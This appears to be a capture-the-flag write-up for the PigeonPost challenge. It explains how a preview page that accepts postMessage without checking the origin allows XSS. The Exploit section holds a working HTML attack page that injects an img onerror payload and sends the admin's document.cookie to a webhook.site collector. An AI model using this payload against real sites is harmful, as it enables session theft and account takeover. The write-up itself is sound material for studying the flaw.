# PigeonPost — Sandboxed iframe Bypass via postMessage XSS

## Overview

PigeonPost is a webmail-style inbox where a bot (Moderator Pidge) with admin cookies visits any URL submitted via the report feature. Message previews are rendered inside a sandboxed iframe at `/preview`. The flag is stored in the admin session cookie.

---

## Vulnerability

The `/preview` page listens for `postMessage` events **without verifying `e.origin`**:

```javascript
window.addEventListener('message', e => {
  document.getElementById('out').innerHTML = e.data.html;
});
```

This means any page — including an attacker-controlled external page — can send a `postMessage` to an embedded `/preview` iframe and inject arbitrary HTML/JS into it.

Additionally, the main app sends messages to the iframe with `targetOrigin: '*'`:

```javascript
frame.contentWindow.postMessage({ html: msg.body, subject: msg.subject }, '*');
```

Both sides of the postMessage channel are insecure.

---

## Key Insight

When `/preview` is embedded **without** the `sandbox` attribute (i.e. from an attacker's page rather than from the main app), it runs with full same-origin privileges on `offsec.m0lecon.it`. This means `document.cookie` is accessible and `fetch` requests go to the challenge origin with the bot's session cookies.

---

## Exploit

Hosted this page on GitHub Pages and submitted its URL to the report feature:

```html
<!DOCTYPE html>
<html>
<body>
<iframe id="f" 
  src="https://<challenge-host>/preview">
</iframe>
<script>
  document.getElementById('f').addEventListener('load', () => {
    document.getElementById('f').contentWindow.postMessage({
      html: `<img src=x onerror="fetch('https://webhook.site/<token>/?c='+document.cookie)">`
    }, '*');
  });
</script>
</body>
</html>
```

---

## Steps

1. Created a GitHub Pages repository and hosted the exploit HTML as `index.html`
2. The page embeds `/preview` in an iframe without any `sandbox` attribute
3. On load, sends a `postMessage` to the iframe with an XSS payload in `html`
4. `/preview` renders the payload via `innerHTML`, triggering the `onerror` handler
5. `document.cookie` (accessible because the iframe runs on the challenge origin without sandbox) is exfiltrated to webhook.site
6. Submitted the GitHub Pages URL to **"Report to Moderator Pidge"**
7. The bot visited the page, the XSS fired, and the admin cookie arrived on webhook.site
